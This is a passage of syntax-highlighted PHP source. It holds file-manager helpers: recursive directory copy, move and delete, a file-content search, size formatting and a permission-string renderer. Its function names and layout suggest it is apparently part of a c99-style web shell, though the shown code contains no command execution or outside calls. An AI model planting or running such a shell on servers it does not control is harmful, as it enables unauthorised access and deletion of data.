        <span class="k">return</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="p">);}</span>
      <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
          <span class="nv">$ret</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
          <span class="k">else</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">)</span> <span class="k">and</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}}</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
         <span class="p">}</span>
       <span class="p">}</span>
      <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
      <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">fs_move_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
      <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
        <span class="k">return</span> <span class="nx">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="p">);}</span>
        <span class="k">else</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
      <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
          <span class="k">else</span> <span class="p">{</span><span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">);</span> <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
      <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
      <span class="k">return</span> <span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">fs_rmobj</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$o</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$o</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
        <span class="k">return</span> <span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$o</span><span class="p">);}</span>
      <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
    <span class="p">}</span>
     
    <span class="k">function</span> <span class="nf">onphpshutdown</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">global</span> <span class="nv">$gzipencode</span><span class="p">,</span><span class="nv">$ft</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">headers_sent</span><span class="p">()</span> <span class="k">and</span> <span class="nv">$gzipencode</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ft</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;img&quot;</span><span class="p">,</span><span class="s2">&quot;download&quot;</span><span class="p">,</span><span class="s2">&quot;notepad&quot;</span><span class="p">)))</span> <span class="p">{</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzHandler&quot;</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nv">$v</span><span class="p">;</span>
        <span class="o">@</span><span class="nb">ob_end_flush</span><span class="p">();</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">tpshexit</span><span class="p">()</span> <span class="p">{</span> <span class="nx">onphpshutdown</span><span class="p">();</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
     
    <span class="k">function</span> <span class="nf">tpfsearch</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">global</span> <span class="nv">$found</span><span class="p">,</span> <span class="nv">$found_d</span><span class="p">,</span> <span class="nv">$found_f</span><span class="p">,</span> <span class="nv">$search_i_f</span><span class="p">,</span> <span class="nv">$search_i_d</span><span class="p">,</span> <span class="nv">$a</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
      <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
      <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$bool</span> <span class="o">=</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name_regexp&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">])</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name_regexp&quot;</span><span class="p">]</span> <span class="k">and</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">],</span><span class="nv">$f</span><span class="p">));</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$search_i_d</span><span class="o">++</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_d</span><span class="o">++</span><span class="p">;}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="nx">tpfsearch</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);}</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$search_i_f</span><span class="o">++</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$r</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_wwo&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;}</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_cs&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]);</span> <span class="nv">$r</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_regexp&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="nv">$r</span><span class="p">);}</span>
                <span class="k">else</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">strpos</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$r</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="mi">1</span><span class="p">);}</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_not&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="o">!</span><span class="nv">$bool</span><span class="p">;}</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;}</span>
              <span class="p">}</span>
              <span class="k">else</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;}</span>
            <span class="p">}</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">view_size</span><span class="p">(</span><span class="nv">$size</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$size</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1073741824</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; GB&quot;</span><span class="p">;}</span>
        <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1048576</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1048576</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; MB&quot;</span><span class="p">;}</span>
        <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1024</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1024</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; KB&quot;</span><span class="p">;}</span>
        <span class="k">else</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nv">$size</span> <span class="o">.</span> <span class="s2">&quot; B&quot;</span><span class="p">;}</span>
        <span class="k">return</span> <span class="nv">$size</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">tabsort</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> <span class="k">global</span> <span class="nv">$v</span><span class="p">;</span> <span class="k">return</span> <span class="nb">strnatcmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$v</span><span class="p">],</span> <span class="nv">$b</span><span class="p">[</span><span class="nv">$v</span><span class="p">]);}</span>
    <span class="k">function</span> <span class="nf">view_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
      <span class="k">else</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
      <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
      <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
      <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
      <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
      <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
      <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
      <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
      <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span><span class="o">?</span> <span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
      <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x800</span><span class="p">)</span> <span class="p">{</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x400</span><span class="p">)</span> <span class="p">{</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x200</span><span class="p">)</span> <span class="p">{</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;t&quot;</span><span class="o">:</span><span class="s2">&quot;T&quot;</span><span class="p">;}</span>
      <span class="k">return</span> <span class="nv">$type</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$owner</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$group</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$world</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">parse_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
